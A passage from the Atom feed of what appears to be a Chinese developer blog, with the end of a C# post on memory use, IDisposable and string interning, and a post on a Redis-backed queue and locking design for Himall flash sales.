class=&quot;comment&quot;&gt;//do something&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以将struct改为class。实例对象之后则是引用类型。或使用ref关键字将方法改为Do(ref ConstNum x)，也可以达到引用类型的作用。&lt;/p&gt;
&lt;h2 id=&quot;静态&quot;&gt;&lt;a href=&quot;#静态&quot; class=&quot;headerlink&quot; title=&quot;静态&quot;&gt;&lt;/a&gt;静态&lt;/h2&gt;&lt;p&gt;有一个Dude类，你需要实例化多个对像使用。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Class Dude&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; _name =&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SayHello&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//DoSomething&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/CSharp-9.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;你可以使用静态方法,以达到内存节省的目的。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Class Dude&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; _name =&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SayHello&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//DoSomething&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/CSharp-10.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;实际项目中使用单例模式来达到省内存的目的。&lt;/p&gt;
&lt;h2 id=&quot;IDisposable与析构函数&quot;&gt;&lt;a href=&quot;#IDisposable与析构函数&quot; class=&quot;headerlink&quot; title=&quot;IDisposable与析构函数&quot;&gt;&lt;/a&gt;IDisposable与析构函数&lt;/h2&gt;&lt;p&gt;托管的资源只能由CG回收。而非托管的资源可以通过实现IDisposable进行释放。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;CDisposable&lt;/span&gt; : &lt;span class=&quot;title&quot;&gt;IDisposable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//析构函数，编译后变成 protected void Finalize()，GC会在回收对象前会调用调用该方法 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ~CDisposable() &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Dispose(&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//通过实现该接口，显式地释放对象，只针对非托管对象。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Dispose&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Dispose(&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Dispose调用&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Using(MyClass myObj = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; CDisposable())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//DoSomething&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者直接调myObj.Dispose();&lt;/p&gt;
&lt;h2 id=&quot;字符串的内存规则&quot;&gt;&lt;a href=&quot;#字符串的内存规则&quot; class=&quot;headerlink&quot; title=&quot;字符串的内存规则&quot;&gt;&lt;/a&gt;字符串的内存规则&lt;/h2&gt;&lt;p&gt;string是引用类型，但string的值是不可变，但你改变string值的时候会对新值重新分配内存,老值仍驻留在内存中。&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; a = &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a += &lt;span class=&quot;string&quot;&gt;&quot;5678&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Console.ReadLine();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看起来我们似乎已经把a的值从“1234”改为了“12345678”，实际上并没有改变。因为string的值是无法修改不了了。堆中其实存在着两个字符串对象。字符串“1234”仍然在内存中驻留。&lt;/p&gt;
&lt;p&gt;string容易引起内存驻留，但我们仍有办法减少内存使用。&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str1 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str2 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str3 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD&quot;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str4 = &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str5 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD&quot;&lt;/span&gt; + str4;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;.ReferenceEquals(str1, str2) == True；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;.ReferenceEquals(str1, str3) == True；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;.ReferenceEquals(str1, str5) == False&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过上面比较，字符串都驻留在内存。尽量使用字符串相加来代替字符串变量和字符创相加，这样可以使用重复利用字符串驻留，减少内存使用。&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str3 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD&quot;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对string作频繁的操作使用StringBuilder或string.format(也是StringBuilder实现)处理。&lt;br&gt;StringBuilder内部维护一个字符数组，而不是一个string来避免string操作带来的新的string的创建。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;CSharp&quot;&gt;StringBuilder sb = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StringBuilder();
sb.Append(str1);
sb.Append(str2);
sb.Append(str3);
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;CSharp&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; sb = &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;.format(&lt;span class=&quot;string&quot;&gt;&quot;{0}{1}{2}&quot;&lt;/span&gt;,str1,str2,str3);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于sb = str1 + str2 + str3;&lt;/p&gt;
&lt;p&gt;4.高效地进行string的比较操作&lt;br&gt;对象之间的比较有比较Value和比较Reference之说。一般地对Reference进行比较的速度最快，因为只需要比较一下是不是同一地址就行了。&lt;br&gt;object.ReferenceEquals和string. Compare就是引用比较的方法。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;.net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。&lt;/p&gt;
&lt;h2 id=&quot;内存模型-堆与栈&quot;&gt;&lt;a href=&quot;#内存模型-堆与栈&quot; class=&quot;headerlink&quot; title=&quot;内存模型:堆与栈&quot;&gt;&lt;/a&gt;内存模型:堆与栈&lt;/h2&gt;&lt;p&gt;C#内存主要有两类：Stack和Heap&lt;br&gt;Stack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。&lt;br&gt;Heap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。&lt;br&gt;&lt;img src=&quot;/img/CSharp-1.jpg&quot; alt=&quot;效果&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>浅谈Himall商城限时购设计</title>
    <link href="http://binyanbin.github.io/2016/04/21/hishop-1/"/>
    <id>http://binyanbin.github.io/2016/04/21/hishop-1/</id>
    <published>2016-04-20T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Himall&lt;/a&gt;限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。&lt;br&gt;什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对高并发，我们如何解耦后端压力，特别是数据库的压力。&lt;/li&gt;
&lt;li&gt;如何保障库存可靠。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以试想一下抢购时哪些页面会请求最多。抢购之前人们通常会通常刷页面等待，一般在抢购开始前一点时间会频繁刷新抢购倒数的页面或购买详情页面。抢购开始以后前一段时间下单的人会很多。付款并发量相对较小，通常订单在下单后几小时内都能付款，缓解了并发压力。针对以上问题及场景，我们做了以下处理，增加限时购缓存订单系统，去支持限时购高并发处理，并保持限时购业务的可靠性。&lt;br&gt;&lt;img src=&quot;/img/hishop-1.png&quot; alt=&quot;图1&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hiamll&lt;/a&gt;在2.3版本做了如下改进:&lt;br&gt;1.引入Redis做缓存。&lt;br&gt;2.在用户抢购开始前频繁刷页面时,系统只从缓存中取商品数据，解耦了数据库查询的压力。&lt;br&gt;3.用户下单时系统只把订单数据存入订单缓存队列后然后告诉用户你的订单正在处理。然后由Redis Pub/Sub服务通知Web服务器，服务器把库存订单进行串行化处理，解耦数据库并发下单压力，保证库存可靠。&lt;br&gt;4.支付功能保持原来实现不变。&lt;/p&gt;
&lt;p&gt;具体实现如下:&lt;br&gt;买家前端查询限时购商品数据时只走缓存。&lt;br&gt;&lt;img src=&quot;/img/hishop-2.png&quot; alt=&quot;图2&quot;&gt;&lt;br&gt;卖家后台更新限时购或库存信息时需同步更新数据库及缓存。&lt;br&gt;&lt;img src=&quot;/img/hishop-3.png&quot; alt=&quot;图3&quot;&gt;&lt;br&gt;系统为每个正在开卖的限时购商品库存创建锁，买家对某库存下单时锁住该库存的下单操作，每一个商品库存只允许一个会员下单，下单的订单数据直接加入订单缓存后告诉买家[您的订单正在处理,请稍等]。然后通过Redis Pub/Sub服务通知服务器处理订单，将订单按库存串行化处理，订单处理完成后，则更新限时购订单缓存的处理状态。&lt;br&gt;&lt;img src=&quot;/img/hishop-4.png&quot; alt=&quot;图4&quot;&gt;&lt;br&gt;买家得知订单正在处理后，则不断查询缓存的订单处理状态。直到获取订单处理结果，下单成功则进行支付页面，失败则提示失败原因并引导买家重新下单。&lt;br&gt;&lt;img src=&quot;/img/hishop-5.png&quot; alt=&quot;图5&quot;&gt;&lt;br&gt;最后就是在Web服务启动时，需要对限时购订单缓存系统初始化，把商品数据加入缓存中，并处理上次未处理完成的订单。&lt;br&gt;&lt;img src=&quot;/img/hishop-6.png&quot; alt=&quot;图6&quot;&gt;&lt;/p&gt;
&lt;p&gt;总结:无论你用什么方式处理性能问题，性能优化的核心思想是分治。这种思想在日常生活中无处不在，大家都知道一次做不了的事，就分多次做，这就是分治。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;Himall&lt;/a&gt;限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。&lt;br&gt;什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对高并发，我们如何解耦后端压力，特别是数据库的压力。&lt;/li&gt;
&lt;li&gt;如何保障库存可靠。
    
    </summary>
    
    
  </entry>
  
</feed>
